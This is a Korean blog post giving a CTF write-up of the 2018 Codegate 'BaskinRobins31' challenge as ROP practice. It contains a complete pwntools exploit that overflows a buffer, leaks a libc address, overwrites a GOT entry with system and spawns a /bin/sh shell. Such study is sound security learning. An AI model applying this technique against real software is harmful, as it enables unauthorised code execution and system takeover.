---
layout: post
title: "2018 Codegate BaskinRobins31 Write up"
excerpt: "ROP를 공부하기 적합한 간단한 문제"
date: 2020-05-12
categories: [system, ctf]
comments: true
---

요세는 새로운 내용을 공부하는게 아닌 기존 지식들을 다시 되돌아보고 있는중이다. 이 문제는 워낙 rop를 공부할때

유용하다고 평이 나있는 문제라 다시 풀어봤다.

1. binary :

![bas1](/img/bas1.png)

2. code :

![bas2](/img/bas2.png)

3. gadget :

![bas3](/img/bas3.png)

![bas4](/img/bas4.png)

위에는 bss를 입혀주기 위한 pr이고 밑에는 write나 read를 위한 pppr이다.



4. exploit :

```python
from pwn import *

e = ELF("./BaskinRobins31")
p = process("./BaskinRobins31")
s = ELF("/lib/x86_64-linux-gnu/libc.so.6")

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']

write_got = e.got['write']
read_offset = s.symbols['read']
sys_offset = s.symbols['system']

bss = e.bss()
sh = "/bin/sh"
pppr = 0x40087a
pr = 0x400bc3

p.recvuntil("How many numbers do you want to take ? (1-3)")

pay = 'A'*184
pay += p64(pppr)
pay += p64(1)
pay += p64(read_got)
pay += p64(8)
pay += p64(write_plt)

pay += p64(pppr)
pay += p64(0)
pay += p64(bss)
pay += p64(len(sh))
pay += p64(read_plt)

pay += p64(pppr)
pay += p64(0)
pay += p64(read_got)
pay += p64(8)
pay += p64(read_plt)

pay += p64(pr)
pay += p64(bss)
pay += p64(read_plt)

p.sendline(pay)
p.recvuntil("Don't break the rules...:( \n")
read_addr = u64(p.recv(6)+"\x00\x00")
log.success('leak: '+hex(read_addr))
libc = read_addr - read_offset
sys_addr = libc + sys_offset
time.sleep(0.1)
p.send(sh)
time.sleep(0.1)
p.sendline(p64(sys_addr))
p.interactive()
```



p. s
64bit rop를 할때는 plt를 밑에다 넣어줘야함. 

